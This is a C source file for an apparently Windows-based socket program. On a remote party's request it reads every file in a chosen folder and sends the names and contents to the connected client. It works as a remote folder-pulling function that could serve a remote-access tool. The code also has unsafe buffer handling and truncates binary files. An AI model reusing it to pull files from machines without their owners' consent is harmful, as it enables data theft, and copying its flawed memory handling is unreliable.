#include "cpy.h"

void initQueue(Queue *q) {
    q->front = q->rear = NULL;
}

void enqueue(Queue *q, const char *filename, const char *content) {
    Node *newNode = (Node *)malloc(sizeof(Node));
    strncpy(newNode->filename, filename, sizeof(newNode->filename));
    newNode->content = myStrdup(content);  // copy string
    newNode->next = NULL;

    if (!q->rear) {
        q->front = q->rear = newNode;
    } else {
        q->rear->next = newNode;
        q->rear = newNode;
    }
}

void dequeueAll(Queue *q) {
    while (q->front) {
        Node *tmp = q->front;
        q->front = q->front->next;
        free(tmp->content);
        free(tmp);
    }
    q->rear = NULL;
}

char *read_file(const char *filepath) {
    FILE *fp = fopen(filepath, "rb");
    if (!fp) return NULL;

    fseek(fp, 0, SEEK_END);
    long size = ftell(fp);
    rewind(fp);

    char *buffer = (char *)malloc(size + 1);
    fread(buffer, 1, size, fp);
    buffer[size] = '\0';

    fclose(fp);
    return buffer;
}

void exec(paramSurf * param){
	Queue q;
	initQueue(&q);

	char buffer[256] = {0};

	strcpy(buffer, "\nPILIH FOLDER YANG AKAN DIAMBIL\n");
	send((param)->paramT->clientSocket, buffer, strlen(buffer), 0);
	memset(buffer, 0, strlen(buffer));

	strcpy((param)->input, "NULL");
	while(strcmp((param)->input, "NULL") == 0) Sleep(50);

	struct dirent *entry;
	while ((entry = readdir((param)->dir)) != NULL) {
		if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
			continue;

		char fullpath[512];
		snprintf(fullpath, sizeof(fullpath), "%s\\%s", (param)->input, entry->d_name);

		char *content = read_file(fullpath);
		if (content != NULL) {
			enqueue(&q, entry->d_name, content);
			free(content);
		}
	}

	// Tampilkan isi file
	Node *current = q.front;

	memset(buffer, 0, strlen(buffer));
	strcpy(buffer, "MAKEFOLDER");
	send((param)->paramT->clientSocket, buffer, strlen(buffer), 0);
	Sleep(101);

	memset(buffer, 0, strlen(buffer));
	strcpy(buffer, (param)->input);
	send((param)->paramT->clientSocket, buffer, strlen(buffer), 0);
	Sleep(101);

	while(current != NULL){
		printf("YADAYADA\n");
		memset(buffer, 0, strlen(buffer));
		strcpy(buffer, "GETFILE2");
		send((param)->paramT->clientSocket, buffer, strlen(buffer), 0);
		memset(buffer, 0, strlen(buffer));

		Sleep(101);
		printf("\nGET: %s\n", current->filename);
		send((param)->paramT->clientSocket, current->filename, strlen(current->filename), 0);
		Sleep(101);

		send((param)->paramT->clientSocket, current->content, strlen(current->content), 0);
		Sleep(101);
		
		strcpy(buffer, "ENDGETFILE");
		send((param)->paramT->clientSocket, buffer, strlen(buffer), 0);
		memset(buffer, 0, strlen(buffer));

		current = current->next;
		Sleep(101);
	}

	// Bersihkan memori
	dequeueAll(&q);
}
